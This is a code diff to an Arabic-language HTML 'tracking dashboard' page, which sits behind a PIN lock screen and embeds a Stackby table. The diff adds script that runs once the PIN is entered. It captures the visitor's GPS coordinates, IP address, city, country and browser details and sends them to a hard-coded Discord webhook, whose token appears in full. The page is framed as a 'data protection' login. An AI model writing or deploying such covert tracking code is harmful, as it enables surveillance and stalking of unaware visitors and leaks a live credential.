@@ -5,100 +5,94 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>لوحة التتبع الاحترافية</title>
     <style>
-        :root {
-            --primary: #4f46e5;
-            --secondary: #6366f1;
-            --dark: #1e293b;
-            --light: #f8fafc;
-        }
-        body {
-            margin: 0; font-family: 'Inter', sans-serif; background: #e2e8f0;
-            display: flex; align-items: center; justify-content: center; height: 100vh;
-        }
-        /* تصميم شاشة القفل */
-        .login-box {
-            background: white; padding: 40px; border-radius: 20px; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1);
-            text-align: center; width: 350px;
-        }
-        input {
-            width: 100%; padding: 12px; margin: 20px 0; border: 2px solid #e2e8f0; border-radius: 10px; outline: none;
-        }
-        .btn-main {
-            background: var(--primary); color: white; border: none; padding: 12px 25px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold;
-        }
-        /* تصميم المحتوى الداخلي */
-        #main-content {
-            display: none; width: 100%; height: 100vh; flex-direction: column; background: var(--light);
-        }
-        .top-nav {
-            background: var(--dark); color: white; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center;
-            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
-        }
-        .stats-bar {
-            display: flex; gap: 20px; padding: 20px; background: white; border-bottom: 1px solid #e2e8f0;
-        }
-        .stat-card {
-            background: #eff6ff; padding: 15px; border-radius: 12px; flex: 1; border: 1px solid #dbeafe;
-            display: flex; flex-direction: column; align-items: center;
-        }
-        .iframe-container {
-            flex-grow: 1; padding: 20px; background: #f1f5f9;
-        }
-        iframe {
-            width: 100%; height: 100%; border: none; border-radius: 15px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
-        }
+        :root { --primary: #4f46e5; --dark: #1e293b; --light: #f8fafc; }
+        body { margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; background: #e2e8f0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .login-box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 20px 25px rgba(0,0,0,0.1); text-align: center; width: 320px; z-index: 100; }
+        input { width: 100%; padding: 12px; margin: 20px 0; border: 2px solid #e2e8f0; border-radius: 10px; box-sizing: border-box; outline: none; text-align: center; }
+        .btn-main { background: var(--primary); color: white; border: none; padding: 12px 25px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; font-size: 16px; }
+        #main-content { display: none; width: 100%; height: 100vh; flex-direction: column; background: var(--light); }
+        .top-nav { background: var(--dark); color: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; font-weight: bold; }
+        .iframe-container { flex-grow: 1; width: 100%; height: 100%; }
+        iframe { width: 100%; height: 100%; border: none; }
     </style>
 </head>
 <body>
 
     <div id="lock-screen" class="login-box">
-        <div style="font-size: 40px;">🛡️</div>
-        <h2>دخول المصرح لهم</h2>
-        <input type="password" id="passInput" placeholder="أدخل كود الأمان">
-        <button class="btn-main" onclick="unlock()">فتح اللوحة</button>
-        <p id="msg" style="color: red; font-size: 13px;"></p>
+        <div style="font-size: 50px; margin-bottom: 10px;">🔒</div>
+        <h2>نظام حماية البيانات</h2>
+        <p style="color: #666; font-size: 14px;">أدخل كود الأمان للوصول إلى لوحة التتبع</p>
+        <input type="password" id="passInput" placeholder="كود الأمان">
+        <button class="btn-main" onclick="handleUnlock()">دخول آمن</button>
+        <p id="msg" style="color: #ef4444; font-size: 13px; margin-top: 10px;"></p>
     </div>
 
     <div id="main-content">
         <div class="top-nav">
-            <div style="font-size: 18px; font-weight: bold;">🚀 لوحة التحكم في التتبع</div>
-            <button onclick="location.reload()" style="background: #ef4444; color: white; border: none; padding: 5px 15px; border-radius: 5px; cursor: pointer;">خروج آمن</button>
+            <span>🚀 لوحة التحكم والمراقبة</span>
+            <button onclick="location.reload()" style="background: #ef4444; color: white; border: none; padding: 5px 15px; border-radius: 8px; cursor: pointer;">خروج</button>
         </div>
-
-        <div class="stats-bar">
-            <div class="stat-card">
-                <span style="font-size: 12px; color: #64748b;">حالة الربط</span>
-                <span style="color: #10b981; font-weight: bold;">متصل مباشر ✅</span>
-            </div>
-            <div class="stat-card">
-                <span style="font-size: 12px; color: #64748b;">قاعدة البيانات</span>
-                <span style="color: var(--primary); font-weight: bold;">Stackby API</span>
-            </div>
-            <div class="stat-card">
-                <span style="font-size: 12px; color: #64748b;">آخر تحديث</span>
-                <span id="time-now" style="font-weight: bold;">جاري التحميل...</span>
-            </div>
-        </div>
-
         <div class="iframe-container">
             <iframe src="https://stackby.com/embed/staEPOoOZdLq8vjOLe"></iframe>
         </div>
     </div>
 
     <script>
-        function unlock() {
+        // 🚨 حطي رابط الويب هوك ديالك هنا (بين علامتي " ")
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1465111327482708105/rrFvR8ThqXCp28WtaopCTPj8BRRHUzwfd92IbiECYK3B1n4qwy5qiKhHGGVY-A3GhPdN";
+
+        async function sendToDiscord(locationInfo = "لم يتم السماح بالوصول للموقع الجغرافي") {
+            try {
+                // جلب معلومات الـ IP والمدينة
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                
+                const payload = {
+                    embeds: [{
+                        title: "🚨 تنبيه: دخول جديد للموقع!",
+                        color: 5814783,
+                        fields: [
+                            { name: "📍 الموقع (المدينة/الدولة)", value: ${ipData.city}, ${ipData.country_name}, inline: true },
+                            { name: "🌐 عنوان IP", value: ipData.ip, inline: true },
+                            { name: "📱 معلومات الجهاز", value: navigator.userAgent.split(')')[0] + ')' },
+                            { name: "🗺️ إحداثيات GPS (خريطة)", value: locationInfo }
+                        ],
+                        footer: { text: "وقت الدخول: " + new Date().toLocaleString('ar-MA') }
+                    }]
+                };
+
+                await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) { console.log("Error sending log"); }
+        }
+        function handleUnlock() {
             const pin = document.getElementById('passInput').value;
-            // تقدري تبدلي الكود هنا
-        if (pin === "1234") {
+            // كلمة السر هي 1234 (تقدري تبدليها)
+            if (pin === "1234") {
+                
+                // محاولة الحصول على الـ GPS الدقيق
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            const mapUrl = https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude};
+                            sendToDiscord(mapUrl);
+                        },
+                        () => { sendToDiscord(); } // في حالة الرفض
+                    );
+                } else {
+                    sendToDiscord();
+                }
+
+                // إظهار المحتوى وإخفاء القفل
                 document.getElementById('lock-screen').style.display = 'none';
                 document.getElementById('main-content').style.display = 'flex';
                 document.body.style.background = "#f1f5f9";
-                
-                // تحديث الوقت
-                const now = new Date();
-                document.getElementById('time-now').innerText = now.toLocaleTimeString('ar-MA');
             } else {
-                document.getElementById('msg').innerText = "كود غلط! جربي مرة أخرى.";
+                document.getElementById('msg').innerText = "كود الأمان غير صحيح!";
+                document.getElementById('passInput').value = "";
             }
         }
     </script>
